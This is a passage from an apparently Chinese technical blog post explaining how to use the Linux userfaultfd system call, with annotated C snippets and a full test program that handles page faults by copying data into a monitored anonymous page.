class="hljs-comment">//...</span><br><br><span class="hljs-keyword">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-keyword">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br><span class="hljs-keyword">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br></code></pre></div></td></tr></table></figure><p>首先通过 userfaultfd 系统调用注册一个 userfaultfd，其中 <code>O_CLOEXEC</code> 和 <code>O_NONBLOCK</code> 和 open 的 flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 <code>userfault</code></p><p>这里用 mmap 分一个匿名页用作后续被监视的区域</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br><span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>uffdio_api.api = UFFD_API;<br>uffdio_api.features = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br><span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">    demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">    actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">    the userfaultfd. */</span><br>len = <span class="hljs-number">0x1000</span>;<br>addr = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>    errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>为这块内存区域注册 userfaultfd</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>uffdio_register.range.len = len;<br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-keyword">void</span> *) uffd);<br><span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>monitor 轮询线程应当定义如下形式，这里给出的是 UFFD_COPY，即将自定义数据拷贝到 faulting page 上：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-keyword">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>有人可能注意到了 <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> 这个奇怪的句子，在这里作用是将触发缺页异常的地址<strong>按页对齐</strong>作为后续拷贝的起始地址</p><blockquote><p>比如说触发的地址可能是 0xdeadbeef，直接从这里开始拷贝一整页的数据就拷歪了，应当从 0xdeadb000 开始拷贝（假设页大小 0x1000）</p></blockquote><h4 id="例程"><a href="#例程" class="headerlink" title="例程"></a>例程</h4><p>测试例程如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-keyword">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>    <span class="hljs-keyword">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">        demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">        actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">        the userfaultfd. */</span><br>    len = <span class="hljs-number">0x1000</span>;<br>    addr = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>    <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>    <span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-keyword">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br><br>    <span class="hljs-comment">/* Trigger the userfaultfd event */</span><br>    <span class="hljs-keyword">void</span> * ptr = (<span class="hljs-keyword">void</span>*) *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*) addr;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %p\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据</p><p><a 